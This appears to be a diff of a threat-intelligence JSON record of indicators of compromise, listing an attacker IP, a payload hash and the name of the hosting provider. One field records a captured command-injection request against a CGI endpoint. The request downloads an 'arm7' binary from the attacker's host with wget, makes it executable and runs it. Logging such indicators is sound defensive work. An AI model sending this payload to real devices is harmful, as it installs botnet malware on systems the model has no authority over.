@@ -12,16 +12,16 @@
     "value": "31.56.209.XXX"
   },
   {
-    "context": "Inbound payload hash (unknown)",
-    "source": "static_analysis",
-    "type": "hash",
-    "value": "fe28d3ca5d710904586bac6e082159887090e1068d4e53a5981cdc905682f1c9"
-  },
-  {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "GET /cgi-bin/shortcut_telnet.cgi?cd%20/tmp%3Brm%20arm7%3Bwget%20http%3A//31.56.209.XXX/arm7%3Bchmod%20777%20*%3B./arm7%2"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "fe28d3ca5d710904586bac6e082159887090e1068d4e53a5981cdc905682f1c9"
   },
   {
     "asn": "Vpsvault.host Ltd",
